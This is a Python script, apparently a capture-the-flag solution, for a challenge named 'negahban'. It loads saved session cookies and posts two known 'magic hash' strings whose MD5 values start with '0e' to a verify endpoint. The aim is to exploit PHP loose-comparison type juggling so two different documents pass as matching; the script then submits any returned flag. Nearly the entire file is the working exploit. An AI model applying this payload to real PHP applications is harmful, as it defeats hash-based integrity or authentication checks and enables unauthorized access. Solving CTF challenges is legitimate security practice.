import sys
import http.cookiejar
import requests
import json

cookie_file = sys.argv[1] if len(sys.argv) > 1 else "/Users/ricksabchez/workspace/ramzolmasal_cookies_ebrahimi.txt"

session = requests.Session()
cj = http.cookiejar.MozillaCookieJar(cookie_file)
cj.load(ignore_discard=True, ignore_expires=True)
session.cookies = cj

headers = {
    "Content-Type": "application/json",
    "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
}

# Magic md5 collision payload (PHP type juggling 0e...)
# Two strings whose md5 starts with '0e' followed by digits
# "QNKCDZO" -> 0e830400451993494058024219903391
# "240610708" -> 0e462097431906509019562988736854
doc1 = "QNKCDZO"
doc2 = "240610708"

r = session.post("https://256.yektanet.tech/ramzolmasal/api/negahban/verify", json={"doc1": doc1, "doc2": doc2}, headers=headers).json()
print("Negahban verify response:", r)
if r.get("flag"):
    sub = session.post("https://256.yektanet.tech/ramzolmasal/api/submit", json={"challenge_id": "negahban", "flag": r.get("flag")}, headers=headers).json()
    print("Negahban submit result:", sub)
EOF